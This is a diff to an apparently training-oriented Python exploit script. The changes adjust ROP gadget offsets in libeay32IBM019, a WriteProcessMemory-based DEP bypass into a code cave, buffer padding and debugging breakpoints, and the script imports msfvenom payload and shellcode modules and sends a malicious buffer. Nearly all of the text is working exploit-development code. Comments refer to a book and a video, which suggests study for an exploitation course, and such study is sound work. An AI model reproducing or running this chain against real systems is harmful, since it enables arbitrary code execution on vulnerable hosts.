@@ -226,7 +226,7 @@ from colorama import Back, Fore, Style, init
 from modules.msfvenom_module import generatePayload
 from modules.shellcode import getShellcode
 
-from .utils import log, checkBadChars, checkNullBytes, sendMalBuff, parse_args, printBuffer, leakFunctionAddress, repeat_bytes
+from utils.util import log, checkBadChars, checkNullBytes, sendMalBuff, parse_args, printBuffer, leakFunctionAddress, repeat_bytes
 
 DEBUG = True
 DEBUG_Response = False
@@ -288,18 +288,18 @@ def main():
         ******************************* Stage 0: ROP Gadgets *******************************
         ************************************************************************************
         """
-        rop_inc_eax_ret = pack("<L", (libeay32ibm019 + 0x0000BC79))  # inc eax; ret [!!!] Verified
+        rop_inc_eax_ret = pack("<L", (libeay32ibm019 + 0x00088C67))  # inc eax; ret [!] Changed
         rop_neg_eax_ret = pack("<L", (libeay32ibm019 + 0x0001D8C2))  # neg eax ; ret [!!!] Verified
-        rop_pop_eax_ret = pack("<L", (libeay32ibm019 + 0x00048DB7))  # pop eax; ret [!!!] Verified
-        rop_pop_ecx_ret = pack("<L", (libeay32ibm019 + 0x000010C2))  # pop ecx; ret [o] Corrected
+        rop_pop_eax_ret = pack("<L", (libeay32ibm019 + 0x0007DBD2))  # pop eax; ret [!] Changed
+        rop_pop_ecx_ret = pack("<L", (libeay32ibm019 + 0x00088D9E))  # pop ecx; ret [!] Changed
         rop_add_eax_ecx_ret = pack("<L", (libeay32ibm019 + 0x0001D0F0))  # add eax, ecx; ret [!!!] Verified
         rop_xchg_eax_esp_ret = pack("<L", (libeay32ibm019 + 0x0003A003))  # xchg eax, esp ; ret [!!!] Verified
-        rop_mov_ptrEAX_ecx_ret = pack("<L", (libeay32ibm019 + 0x00001F7E))  # mov dword [eax], ecx ; ret [!!!] Verified
-        rop_add_ptrEAX_1_bh_ret = pack("<L", (libeay32ibm019 + 0x0003F8F4))  # add byte [eax+0x00000001], bh ; ret [o] Corrected
+        rop_mov_ptrEAX_ecx_ret = pack("<L", (libeay32ibm019 + +0x0006C574))  # mov dword [eax], ecx ; ret [!] Changed
+        rop_add_ptrEAX_1_bh_ret = pack("<L", (libeay32ibm019 + 0x000762BC))  # add byte [eax+0x00000001], bh ; ret [!] Changed
         rop_push_eax_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408DD))  # push eax; pop esi; ret [!!!] Verified
         rop_push_esp_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408D6))  # push esp; pop esi; ret <- Save ESP to ESI [!!!] Verified
-        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (libeay32ibm019 + 0x0004A7B6))  # sub eax, ecx; pop ebx; ret [!!!] Verified
-        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x00002541))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI [o] Corrected
+        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (libeay32ibm019 + 0x00064E64))  # sub eax, ecx; pop ebx; ret [!] Changed
+        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x0008822E))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI [!] Changed
         rop_int3_int3_int3_int3_ret = pack("<L", (libeay32ibm019 + 0x00087E3C))  #  int3; int3; int3; int3; ret; <- debugging [o] Corrected
         rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10 = pack(
             "<L", (libeay32ibm019 + 0x0008876D)
@@ -327,18 +327,18 @@ def main():
         # NOTE:: My code cave is larger than the book's 0x400
         #        which is why the offset is lower than 0x92c04
         #        (0x880B0)
-        codeCaveOffset = 0x880B0
+        codeCaveOffset = 0x92C04
         wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
         wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Shellcode Return Address
         wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
         wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Code cave address
         wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
-        wpm += pack("<L", (0xCCCCCCCC))  # dummy nSize
+        wpm += pack("<L", (0x42424242))  # dummy nSize
         wpm += pack("<L", (libeay32ibm019 + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
-        wpm += b"A" * 0x10
+        wpm += repeat_bytes("WRITEPROCESS.END", 0x10)
 
-        offsetLen = 274 - len(wpm)
-        offset = repeat_bytes("4f46465345542e544f2e525f454950", offsetLen)
+        offsetLen = 276 - len(wpm)  # FIXED <- Was 274
+        offset = repeat_bytes("OFFSET.TO.R_EIP", offsetLen)
         # 1803_1011 (IGNORE, fixed):
         # Well, something is up with how the PPR gadget is being handled, i lose my 0x030d08d6 for 0x050008d6
         # 030d -> 0500
@@ -355,7 +355,8 @@ def main():
         #                         restarting the PC gave me a new base address and so now it works as expected
         # eip = pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
         eip = rop_push_esp_pop_esi_ret  # <- Save ESP to ESI
-        # eip = rop_int3_int3_int3_int3_ret  # <- Debugging
+        log(f"DEBUG: sent_eip: {hex(struct.unpack('<L', eip)[0])}", level="!!!")
+        eip += rop_int3_int3_int3_int3_ret  # <- Debugging
         # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
         # ! DEBUG: eip: 0x030d08d6
@@ -366,7 +367,6 @@ def main():
         # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6
 
         # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
-        log(f"DEBUG: sent_eip: {hex(struct.unpack('<L', eip)[0])}", level="!!!")
 
         """
         ************************************************************************************
@@ -381,7 +381,7 @@ def main():
         rop += pack("<L", (0x88888888))  # push huge value to "subtract"
         rop += rop_add_eax_ecx_ret  # -> this will set lpBuffer to point to our shellcode on the stack (EAX - 0x77777D78)
         rop += rop_pop_ecx_ret  # pop ecx; ret
-        rop += pack("<L", (0x77777D78))
+        rop += pack("<L", (0x77777878))  # <- CHANGED: From 0x77777D78 to 0x77777878, found from video
         rop += rop_add_eax_ecx_ret  # add eax, ecx; ret
 
         """
@@ -414,7 +414,7 @@ def main():
         rop += rop_inc_eax_ret  # inc eax; ret
         rop += rop_push_eax_pop_esi_ret  # push eax; pop esi; ret
         rop += rop_pop_eax_ret  # pop eax; ret
-        rop += pack("<L", (0xFFFFFDF4))  # -524
+        rop += pack("<L", (0xFFFFFDF4))  # -524, shellcode size. negated to make it positive
         rop += rop_neg_eax_ret  # neg eax ; ret
         rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         rop += pack("<L", (0x42424242))  # junk into esi
